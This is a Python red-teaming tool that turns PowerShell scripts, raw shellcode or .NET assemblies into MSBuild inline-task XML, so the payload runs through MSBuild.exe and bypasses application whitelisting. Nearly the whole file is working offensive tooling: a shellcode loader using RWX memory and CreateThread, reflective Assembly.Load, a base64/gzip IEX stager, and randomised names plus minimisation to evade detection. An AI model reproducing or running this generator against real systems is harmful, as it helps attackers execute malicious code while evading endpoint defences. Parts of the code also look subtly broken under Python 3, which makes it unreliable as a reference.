#!/usr/bin/python3
#
# Red-Teaming script that will leverage MSBuild technique to convert Powershell input payload or
# .NET/CLR assembly EXE file into inline-task XML file that can be further launched by:
#
#   %WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
# or
#   %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
#
# This script can embed following data within constructed CSharp Task:
#   - Powershell code
#   - raw Shellcode in a separate thread via CreateThread
#   - .NET Assembly via Assembly.Load
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import re
import os
import io
import sys
import gzip
import base64
import string
import struct
import random
import binascii
import argparse


def getCompressedPayload(filePath):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj = out, mode = 'w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode()
    )
    return powershell

def getInlineTask(payload, _format):

    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    taskName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))

    launchCode = ''

    if _format == 'exe':

        exeLaunchCode = string.Template('''<ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Reflection" />
      
      <Code Type="Fragment" Language="cs">
        <![CDATA[
                    string payload = "$payload2";
                    byte[] decoded = System.Convert.FromBase64String(payload);

                    Assembly asm = Assembly.Load(decoded);
                    MethodInfo method = asm.EntryPoint;
                    object instance = asm.CreateInstance(method.Name);
                    method.Invoke(instance, null); 
        ]]>
      </Code>''').safe_substitute(
            payload2 = base64.b64encode(payload.encode()).decode()
        )


        launchCode = exeLaunchCode

    elif _format == 'raw':

        foo = str(binascii.hexlify(payload), 'ascii')
        fooarr = ['0x{}'.format(foo[i:i+2]) for i in range(0, len(foo), 2)]
        encodedPayload = '                        '

        for i in range(len(fooarr)):
            if i % 32 == 0 and i > 0:
                encodedPayload += '\n                        '
            encodedPayload += '{}, '.format(fooarr[i])

        encodedPayload = encodedPayload.strip()[:-1]

        shellcodeLoader = string.Template('''<Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System;
            using System.Diagnostics;
            using System.Reflection;
            using System.Runtime.InteropServices;


            public class $templateName : Task {

                [DllImport("kernel32")]
                private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

                [DllImport("kernel32")]
                private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);

                [DllImport("kernel32")]
                private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );

                [DllImport("kernel32")]
                private static extern bool CloseHandle(IntPtr hHandle);

                [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );

                private static UInt32 MEM_COMMIT = 0x1000;
                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                private static UInt32 MEM_RELEASE = 0x8000;

                public override bool Execute() {

                    byte[] payload = new byte[$payloadSize] {
                        $payload2
                    };

                    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(payload, 0, funcAddr, payload.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;

                    hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

                    CloseHandle(hThread);
                    VirtualFree(funcAddr, 0, MEM_RELEASE);

                    return true;
                }                                
            }           
        ]]>
      </Code>''').safe_substitute(
        templateName = templateName,
        payload2 = encodedPayload,
        payloadSize = len(payload)
    )

        launchCode = shellcodeLoader

    else:
        powershellLaunchCode = string.Template('''<Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class $templateName : Task {
                public override bool Execute() {

                    byte[] payload = System.Convert.FromBase64String("$payload2");
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }                                
            }           
        ]]>
      </Code>''').safe_substitute(
            templateName = templateName,
            payload2 = base64.b64encode(payload.encode()).decode()
        )

        launchCode = powershellLaunchCode


    template = string.Template('''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                      -->
  <!--  Automatically generated using `generateMSBuildXML.py` utility    -->
  <!--  by Mariusz B. / mgeeky <mb@binary-offensive.com>                 -->

  <Target Name="$taskName">
    <$templateName />
  </Target>
  <UsingTask TaskName="$templateName" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    $launchCode
    </Task>
  </UsingTask>
</Project>''').safe_substitute(
        taskName = taskName,
        templateName = templateName,
        launchCode = launchCode
    )

    return template

def detectFileIsExe(filePath, forced = False):
    first1000 = []

    with open(filePath, 'rb') as f:
        first1000 = f.read()[:1000]

    if not (first1000[0] == 'M' and first1000[1] == 'Z'):
        return False

    elfanew = struct.unpack('<H', first1000[0x3c:0x3c + 2])[0]

    if not (first1000[elfanew + 0] == 'P' and first1000[elfanew + 1] == 'E'):
        return False

    dosStub = "This program cannot be run in DOS mode."
    printables = ''.join([x for x in first1000[0x40:] if x in string.printable])

    #if not dosStub in printables:
    #    return False
    return True

def minimize(output):
    output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
    output = output.replace('\n', '')
    output = re.sub(r'\s{2,}', ' ', output)
    output = re.sub(r'\s+([^\w])\s+', r'\1', output)
    output = re.sub(r'([^\w"])\s+', r'\1', output)

    variables = {
        'payload' : 'x',
        'method' : 'm',
        'asm' : 'a',
        'instance' : 'o',
        'pipeline' : 'p',
        'runspace' : 'r',
        'decoded' : 'd',
        'MEM_COMMIT' : 'c1',
        'PAGE_EXECUTE_READWRITE' : 'c2',
        'MEM_RELEASE' : 'c3',
        'funcAddr' : 'v1',
        'hThread' : 'v2',
        'threadId' : 'v3',
        'lpAddress' : 'p1',
        'dwSize' : 'p2',
        'flAllocationType' : 'p3',
        'flProtect' : 'p4',
        'dwFreeType' : 'p5',
        'lpThreadAttributes' : 'p6',
        'dwStackSize' : 'p7',
        'lpStartAddress' : 'p8',
        'param' : 'p9',
        'dwCreationFlags' : 'p10',
        'lpThreadId' : 'p11',
        'dwMilliseconds' : 'p12',
        'hHandle' : 'p13',
    }

    for k, v in variables.items():
        output = output.replace(k, v)

    return output

def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile>')
    parser.add_argument('inputFile', help = 'Input file to be encoded within XML. May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')
    parser.add_argument('-m', '--minimize', action='store_true', help = 'Minimize the output XML file.')
    parser.add_argument('-b', '--encode', action='store_true', help = 'Base64 encode output XML file.')
    parser.add_argument('-e', '--exe', action='store_true', help = 'Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!')
    parser.add_argument('-r', '--raw', action='store_true', help = 'Specified input file is a raw Shellcode to be injected in self process in a separate Thread.')

    args = parser.parse_args()

    if args.exe and args.raw:
        sys.stderr.write('[!] --exe and --raw options are mutually exclusive!\n')
        sys.exit(-1)

    return args

def main(argv):
    sys.stderr.write('''
        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

''')
    if len(argv) < 2:
        print('Usage: ./generateMSBuildXML.py <inputFile>')
        sys.exit(-1)

    args = opts(argv)

    _format = 'powershell'

    if args.exe:
        if not detectFileIsExe(args.inputFile, args.exe):
            sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')
            return False

        _format = 'exe'
        sys.stderr.write('[?] File recognized as PE/EXE.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    elif args.raw:
        _format = 'raw'
        sys.stderr.write('[?] File specified as raw Shellcode.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    else:
        sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')

        if args.inputFile.endswith('.exe'):
            return False
            
        payload = getCompressedPayload(args.inputFile)

    output = getInlineTask(payload, _format)

    if args.minimize:
        output = minimize(output)

    if args.encode:
        print(base64.b64encode(output))
    else:
        print(output)

    msbuildPath = r'%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe'
    if 'PROGRAMFILES(X86)' in os.environ:
        msbuildPath = r'%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'

    sys.stderr.write('''

=====================================

Execute this XML file like so:

{} file.xml
    '''.format(msbuildPath))

if __name__ == '__main__':
    main(sys.argv)
